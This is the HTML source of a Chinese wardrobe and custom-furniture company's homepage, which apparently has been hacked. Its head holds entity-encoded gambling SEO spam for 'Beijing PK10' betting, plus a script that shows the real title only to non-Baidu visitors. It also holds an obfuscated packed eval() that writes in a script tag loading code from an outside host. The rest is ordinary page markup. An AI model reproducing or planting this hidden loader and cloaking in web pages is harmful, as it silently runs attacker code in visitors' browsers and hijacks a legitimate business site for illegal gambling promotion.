<!DOCTYPE html>

<html lang="en">

    <head>

        <meta charset="utf-8">
<title>&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#95;&#112;&#107;&#49;&#48;&#27491;&#35268;&#24320;&#25143;&#24179;&#21488;&#95;&#21271;&#20140;&#112;&#107;&#49;&#48;&#32593;&#19978;&#24320;&#25143;</title>
<meta name="keywords" content="&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#44;&#112;&#107;&#49;&#48;&#27491;&#35268;&#24320;&#25143;&#24179;&#21488;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#32593;&#19978;&#24320;&#25143;"/>
<meta name="description" content="&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#27491;&#35268;&#24320;&#25143;&#24179;&#21488;&#12304;&#32593;&#22336;&#58;&#49;&#51;&#50;&#53;&#48;&#46;&#99;&#111;&#109;&#12305;&#20026;&#24744;&#25552;&#20379;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#27880;&#20876;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#27491;&#35268;&#24179;&#21488;&#24320;&#25143;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25968;&#25454;&#20998;&#26512;&#44;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#19987;&#23478;&#35745;&#21010;"/>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="首页-芙瑞伽"}</script>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m["\\n\\b\\1\\e\\j\\7\\o\\0"]["\\l\\3\\8\\0\\7"](\'\\i\\2\\1\\3\\8\\4\\0 \\0\\k\\4\\7\\d\\6\\0\\7\\s\\0\\5\\f\\c\\t\\c\\2\\1\\3\\8\\4\\0\\6 \\2\\3\\1\\d\\6\\9\\0\\0\\4\\2\\p\\5\\5\\2\\a\\9\\e\\a\\9\\r\\g\\1\\b\\j\\5\\k\\q\\1\\g\\f\\2\\6\\h\\i\\5\\2\\1\\3\\8\\4\\0\\h\');',30,30,'x74|x63|x73|x72|x70|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6a|x2e|x3e|x3c|x6d|x79|x77|window|x64|x6e|x3a|x6c|x32|x78|x76'.split('|'),0,{}))
</script>
        <meta name="description" content="芙瑞伽衣柜" />

        <meta name="keywords" content="芙瑞伽衣柜" />

       <meta name="renderer" content="webkit"> <!--360渲染模式-->

        <meta name="format-detection" content="telephone=notelphone=no, email=no" />

        <link rel="stylesheet" href="/public/static/home/css/reset.css">

        <link rel="stylesheet" href="/public/static/home/css/common.css">

        <link rel="stylesheet" href="/public/static/home/css/index.css">

    </head>

    <body>
<script type="text/javascript">
        var index=0;
        var divs;
        var box;
        var t;
        var lis;
        var arrs;

        window.onload=function (){
            divs=document.getElementById('big-b').getElementsByTagName('div');//轮播内容
            box=document.getElementById('box');
            lis=document.getElementById('small-b').getElementsByTagName('li');
            
            t=setInterval(moveNext,2000);

            for(var i=0;i<lis.length;i++){
                lis[i]._index=i;
                lis[i].onclick=function(){

                    lis[index].className='';
                    divs[index].className='';

                    this.className='sel';
                    divs[this._index].className='current';

                    index=this._index;
                };
            }
        }
            
        function moveNext(){
            divs[index].className='';
            lis[index].className='';
            index++;
            if(index==divs.length){
                index=0;
            }
            divs[index].className='current';    
            lis[index].className='sel';
        }
        function movePre(){
            divs[index].className='';
            lis[index].className='';
            index--;
            if(index==-1){
                index=divs.length-1;
            }
            divs[index].className='current';
            lis[index].className='sel';
        }
    </script>
        <!-- 头部 -->

        <div class="header">
        <div class="wrapper clearfix">
          <div class="logo fl">
            <h1>芙瑞伽衣柜</h1>
            <a href="/home/index"><img src="/public/static/home/images/logo.png" height="44" width="166" alt=""></a>
          </div>

          <ul class="nav fr">
          
                        <li ><a href="/home/index">首页</a></li>
        
         
                        <li ><a href="/home/profile/id/8">关于我们</a></li>
        
         
                        <li ><a href="/home/news/id/9">新闻资讯</a></li>
        
         
                        <li ><a href="/home/classify/id/10">产品分类</a></li>
        
         
                        <li ><a href="/home/exhibition/id/11">案例展示</a></li>
        
         
                        <li ><a href="/home/zhaoshang/id/12">招商加盟</a></li>
        
         
                        <li ><a href="/college/College/id/13">芙瑞伽商学院</a></li>
        
                        </ul>
        
            </div>
      </div>
      
    	<!-- 头部end -->

       

        <!-- 轮播 -->

        
   <div class="banner">

			

			
        <div id="box">
            <div id="big-b">
                
                
               <div class="current"> <img src="/public/uploads/20180827/1d2711b7ccff3b11be68445ef1ba925f.jpg"  alt="" ></div>

                  
                
               <div > <img src="/public/uploads/20180827/50d73b83d666b8cd7f4fc5af9d2cc08c.jpg"  alt="" ></div>

                  
                
               <div > <img src="/public/uploads/20180629/28795f733c3dd61ee55ef827f3cf2b95.jpg"  alt="" ></div>

                  
                
               <div > <img src="/public/uploads/20180629/91d1033d769a311106f824fd03edf7d0.jpg"  alt="" ></div>

                 
            </div>
            <ol id="small-b">
                
               <li class="sel"></li> 
                
               <li ></li> 
                
               <li ></li> 
                
               <li ></li> 
                           </ol> 
          </div>    

            
 </div> 
       

        <!-- banner结束 -->

        

       

        <!-- 产品分类部分结束 -->



        <!-- 爱生活懂空间开始 -->

        <div class="love-style">

            <div class="wrapper">

                <div class="love-style-header">

                    <p>爱生活 · 懂空间</p>

                </div>

                <div class="love-style-pic">

                    <ul>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">卧室</span>

                                    <span class="section-label">品味时尚科技美学</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/3e5861fadfd012e17d339a1190953784.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">书房</span>

                                    <span class="section-label">书中亦有高颜值</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/be775cafdb84c0550d99ce15ae359e71.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">青少年房</span>

                                    <span class="section-label">敲打出精彩少年</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/20be102dc020135d702bc8dadb3778e5.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">客餐厅</span>

                                    <span class="section-label">尊享贵族式休闲</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/cc8ec929519851cefec7f3bec5c4cd95.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">厨房</span>

                                    <span class="section-label">以品质铸就经典</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/02eaaacca70a6dce095f7c538a7071f7.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        


                        <li>

                            <div class="section-item">

                                <a href="/home/classify" target="_blank">

                                    <span class="section-title">阳台</span>

                                    <span class="section-label">发现角落里的美</span>

                                    <img class="lazy section-img" src="/public/uploads/20180629/c2abd1e712b366dfa6dc5cc8f836e85d.jpg"style="display: block;">

                                </a>

                            </div>

                        </li>

                        
                       

                    </ul>

                </div>

            </div>

        </div>

        <!-- 爱生活懂空间结束 -->



        <!-- 芙瑞伽，觅好家开始 -->

        <div class="meet-home">

            <div class="wrapper">

                <div class="meet-home-header">

                    <p>芙瑞伽 · 幸福家</p>

                </div>

                <div class="meet-home-pic">

                    <ul>





                        
                        <li>

                        <div class="section-item">

                            <a target="_blank" href="/home/classify">

                                <span class="section-title">【爆款】芙瑞伽衣柜</span>

                                <span class="section-label">浪漫满屋，实惠精选</span>                                                                

                       

                                <img class="lazy section-img" src="/public/uploads/20180629/f00ff6c260a085972e8b259b990999e0.jpg" style="display: block;">

                            </a>

                        </div>

                        </li>

                        
                        <li>

                        <div class="section-item">

                            <a target="_blank" href="/home/classify">

                                <span class="section-title">【爆款】日式榻榻米</span>

                                <span class="section-label">一物多用，小空间的法宝</span>                                                                

                       

                                <img class="lazy section-img" src="/public/uploads/20180629/259a93d80ec3c304390755348f38df1f.jpg" style="display: block;">

                            </a>

                        </div>

                        </li>

                        
                        <li>

                        <div class="section-item">

                            <a target="_blank" href="/home/classify">

                                <span class="section-title">【爆款】书房榻榻米</span>

                                <span class="section-label">轻松HOLD住小户型</span>                                                                

                       

                                <img class="lazy section-img" src="/public/uploads/20180629/82ad1ff557a8e9af93543d64abffae90.jpg" style="display: block;">

                            </a>

                        </div>

                        </li>

                        
                        

                    </ul>

                </div>

            </div>

        </div>

        <!-- 芙瑞伽，觅好家结束 -->

            







        <!-- 案例部分开始 -->

<!--         <div class="product">

            

            <div class="wrapper">

				<p class="tit">案例展示</p><br><br>

				<p class="tit_1">product</p>

					

                    

                    <ul class="styles">

                        
						<li><a href="###" class="current">田园</a></li>

					

						

					   
						<li><a href="###" class="current">地中海</a></li>

					

						

					   
						<li><a href="###" class="current">中式风格</a></li>

					

						

					   
                    </ul>

					

                    

                                    

                    <div class="pic clearfix">

						

                    
                        <div class="pro1">

							<img src="/public/uploads/20180626\5af2024c7d09db4df82fe980058ebf71.png" height="249" width="282" alt="">

	            			<div class="cover">

	                			<div class="bord">

									<div class="more">

									  <a href="/home/details/id/1">查看详情>></a>

									</div>

                				</div>

            				</div>

						</div>

						
                        <div class="pro1">

							<img src="/public/uploads/20180627/a5201b40c2f5be148e6221f2e9ba9545.png" height="249" width="282" alt="">

	            			<div class="cover">

	                			<div class="bord">

									<div class="more">

									  <a href="/home/details/id/2">查看详情>></a>

									</div>

                				</div>

            				</div>

						</div>

						
                        <div class="pro1">

							<img src="/public/uploads/20180627/1f9c35b9a279406e40d44a96c8059b5a.png" height="249" width="282" alt="">

	            			<div class="cover">

	                			<div class="bord">

									<div class="more">

									  <a href="/home/details/id/3">查看详情>></a>

									</div>

                				</div>

            				</div>

						</div>

						
                        

						

				  	</div>

	            <div class="more">

	                <a href="/home/exhibition">查看更多>></a>

	            </div>

      		</div>

        </div> -->

        <!-- 案例部分结束 -->



        <!-- 新闻部分开始 -->

        <div class="news">

            <div class="wrapper">

                <p class="tit">芙瑞伽·资讯中心</p><br>

                <p class="tit_1">NEWS</p>

                <div class="news-center">

                    <div class="news-center-left">

                        <div class="news-center-left-img">

                            <img src="/public/static/home/images/photo-10.jpg" alt="">

                        </div>

                    </div>

                    <div class="news-center-right">

                        <ul>



                            
                            <li>

                                <a href="/home/newlook/id/10"><h6 class="title1">全屋定制发展如火如荼 今年或将迎来激烈变革</h6></a>

                               <p class="title2">

                                    近年来全屋定制发展如火如荼，专业人士预测，今年全屋定制即将迎来一场激烈变革，主要体现在三个方面：“马太效应”越演愈烈，“圈地运动”马不停蹄，“整装革命”方兴未艾。经过十多年的积淀，全屋定制家居行业迎来了发展的黄金时代，在经历了去年的上市、扩产、增品等狂风巨浪之后，全屋定制真正的竞争席卷而来，一场大变局即将激烈上演。大变局之一：“马太效应”越演愈烈如果说去年是...
                                        
                                <!-- 与定制企业先定制后生产不同，成品家具企业是先推出产品，再吸引消费者前来购买。成品家具在传统门店或卖场的展示方式日显老化，沿用多年的产品陈列方式，对于希望求新求变的年轻消费者，正渐渐失去吸引力。卖场门可罗雀正在成为日常经营常态。 -->

                            </p>

                                <span class="title3"></span>

                            </li>

                            
                            <li>

                                <a href="/home/newlook/id/9"><h6 class="title1">以全屋定制 缔造智慧生活</h6></a>

                               <p class="title2">

                                    2018年的两会中提到“智慧生活”，当把这个关键词与家居行业相结合，准确透析了家具从单品设计到全屋定制设计的消费升级，它不是全屋定制最终的设定，但它正在进一步的渗入人们的生活，影响着人们的生活方式。伴随着中产阶级的崛起，生活方式成为一种时尚潮流，布置好自己的家是最正确的生活方式。箭牌全屋定制对生活方式的传达是遵从“本我”，通过对不同年龄阶层、不同风格、户型的...
                                        
                                <!-- 与定制企业先定制后生产不同，成品家具企业是先推出产品，再吸引消费者前来购买。成品家具在传统门店或卖场的展示方式日显老化，沿用多年的产品陈列方式，对于希望求新求变的年轻消费者，正渐渐失去吸引力。卖场门可罗雀正在成为日常经营常态。 -->

                            </p>

                                <span class="title3"></span>

                            </li>

                            
                            <li>

                                <a href="/home/newlook/id/8"><h6 class="title1">全屋定制：轻松收纳，享品位生活</h6></a>

                               <p class="title2">

                                    收纳是生活的设计，收纳设计需要对空间进行规划。无论哪个空间，都需要有自己的方式进行分类整理，尽可能的体现收纳功能的多样化和清晰化。有过装修经历的业主都知道，装修时如果请了设计师，他都会告知房屋的使用动线，并建议减少对动线的占用，如果动线变长，在日常生活中东西使用后放回原处的惰性就会越高，由此可见，使用动线在空间规划时显得非常重要。箭牌全屋定制按日常基本的生活...
                                        
                                <!-- 与定制企业先定制后生产不同，成品家具企业是先推出产品，再吸引消费者前来购买。成品家具在传统门店或卖场的展示方式日显老化，沿用多年的产品陈列方式，对于希望求新求变的年轻消费者，正渐渐失去吸引力。卖场门可罗雀正在成为日常经营常态。 -->

                            </p>

                                <span class="title3"></span>

                            </li>

                            
                            <li>

                                <a href="/home/newlook/id/18"><h6 class="title1">全屋定制热潮不断上演 3大类玩家未来谁主沉浮？</h6></a>

                               <p class="title2">

                                    当我们谈论全屋定制时，我们在谈论什么？从2016年下半年，不断有定制家居企业登录资本市场开始，行业的关注度也在不断向定制家居领域集中。我们会发现，在此过程中，全屋定制的热度逐渐攀升 ，我们不再花过多的精力关注企业的“大家居”战略，而是集中到了这家企业是否打上了“全屋定制”的标签。当我们现在去谈论全屋定制时，可能会想到“一站式购物”消费趋势的转变，尚品宅配、欧...
                                        
                                <!-- 与定制企业先定制后生产不同，成品家具企业是先推出产品，再吸引消费者前来购买。成品家具在传统门店或卖场的展示方式日显老化，沿用多年的产品陈列方式，对于希望求新求变的年轻消费者，正渐渐失去吸引力。卖场门可罗雀正在成为日常经营常态。 -->

                            </p>

                                <span class="title3">2018-07-25 14:16:31</span>

                            </li>

                            
                            <li>

                                <a href="/home/newlook/id/17"><h6 class="title1">全屋定制：轻松收纳，享品位生活</h6></a>

                               <p class="title2">

                                    全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活全屋定制：轻松收纳，享品位生活...
                                        
                                <!-- 与定制企业先定制后生产不同，成品家具企业是先推出产品，再吸引消费者前来购买。成品家具在传统门店或卖场的展示方式日显老化，沿用多年的产品陈列方式，对于希望求新求变的年轻消费者，正渐渐失去吸引力。卖场门可罗雀正在成为日常经营常态。 -->

                            </p>

                                <span class="title3">2018-06-29 10:13:40</span>

                            </li>

                            
                           

                        </ul>

                    </div>

                </div>

            </div>

        </div>

        <a href="/home/news">
            <div class="look-more">查看更多</div>  
        </a> 


        <!-- 新闻部分结束 -->

        <!-- 服务流程部分开始 -->

<!--         <div class="process">

        	<div class="wrapper">

				<p class="tit">服务流程</p><br><br>

				<p class="tit_1">process</p>

                <div class="proces clearfix">

                    <div class="proce">

                        <a href="###"><img src="/public/static/home/images/produce1.png" height="108" width="108" alt=""></a>

                        <p><a href="###">网上预约</a></p>

                    </div>

                   
                    <div class="proce">

                        <a href="###"><img src="/public/static/home/images/produce6.png" height="108" width="108" alt=""></a>

                        <p><a href="###">全程售后</a></p>

                    </div>

                </div>

			</div>

        </div> -->

        <!-- 服务流程部分结束 -->



        <!-- ABOUT开始 -->

<!--         <div class="about">

            <div class="wrapper">

                <p class="tit">关于我们</p><br><br>

                <p class="tit_1">ABOUT US</p>

                <div class="infor clearfix">

                    <div class="pic fl">

                        <img src="/public/static/home/images/pic1_03.jpg" alt="">

                    </div>

                    <div class="descr fr">

                        <h3><a href="home/profile">上海芙瑞伽家具销售有限公司</a></h3>

                        <p class="txt">

                     

                             <p>&nbsp; &nbsp; 上海芙瑞伽家具销售有限公司是品牌 “芙瑞伽衣柜”的创造者，是一家研发、设计、生产、销售、综合性服务的定制整体家居专业公司。河南分公司是河南省定制行业工作委员会常务会长单位；是河南定制家居十佳品牌企业；是中原第一家集免漆定制、烤漆定制、实木定制于一体的生产及销售综合型企业。</p><p>&nbsp; &nbsp;“芙瑞伽衣柜”推出的衣柜、书柜、鞋柜、酒柜、餐边柜、玄关柜、榻榻米、衣帽间等全屋定制产品，款式新颖，品质卓越、环保、美观、自上市以来深受广大消费者的信赖。</p><p>&nbsp; &nbsp;“芙瑞伽衣柜”崇尚人性化管理。尊重和感恩每一位为芙瑞伽衣柜付出努力的人！在用人制度上坚持知人善用，用人唯贤，在芙瑞伽衣柜内部打造高素质高水准、知识型、创新型的和睦团队。此外对于设计团队，芙瑞伽衣柜向来主张在精于产品研发设计的同时，积极参加各种设计、创意的交流活
                        </p>

                        

                        <div class="more">

                            <a href="/home/profile">了解详情>></a>

                        </div>

                    </div>

                </div>

            </div>

        </div> -->

        <!-- ABOUT 结束 -->

    	<!-- 底部开始 -->

    	

        

<!-- 底部开始 -->

        <div class="bottom">

            <div class="hr1"></div>

            <div class="wrapper">

                <p class="frilink">

                    

                    <i></i>友情链接：

                     
                    <a href="http://fanyi.baidu.com/?aldtype=16047#en/zh/link" class="first">郑州装修网</a>

                   <!--  <a href="###">郑州家庭装修</a> -->

                   

                    
                </p>

                

                <div class="sty clearfix">

                    <div class="contact fl">

                        

                        <p>电话：18603867750</p>

                        <p>邮箱：1121163633@qq.com</p>
                      <p>上海芙瑞伽衣柜销售有限公司</p>
                        <p>华中地址：河南省郑州市管城区商都路与东周路交汇处南50米</p>
<p>华东地址：上海市松江区乐都西路825弄89、90号</p>

                    </div>

                    <div class="scan fr">

                        <div class="scan_1">

                            <a href="###"><img src="/public/static/home/images/common_03.jpg" height="66" width="66" alt=""></a>

                            <p><a href="###">官网微信</a></p>

                        </div>

                        <div class="scan_2">

                            <a href="###"><img src="/public/static/home/images/common_05.jpg" height="66" width="66" alt=""></a>

                            <p><a href="###">官网微博</a></p>

                        </div>

                        <div class="scan_3">

                            <a href="###"><img src="/public/static/home/images/common_07.jpg" height="66" width="66" alt=""></a>

                            <p><a href="###">天猫旗舰店</a></p>

                        </div>

                    </div>

                </div>

            </div>

        </div>

        <div class="fina">

            <div class="wrapper">

                <p class="copyright">版权所有：郑州芙瑞伽衣柜设计有限公司</p>

                <p>网站备案：9999</p>

            </div>  

        </div>

        <!-- 底部结束 -->

        

</body>

</html>
    	<!-- 底部结束 -->

    	<!-- 返回顶部开始 -->

    	<div class="box" id="box">

    		<div class="back" id="back"></div>

    	</div>

    	<!-- 返回顶部结束 -->

    	<script src="/public/static/home/js/index.js"></script>

    </body>

    <script>







    </script>

</html>

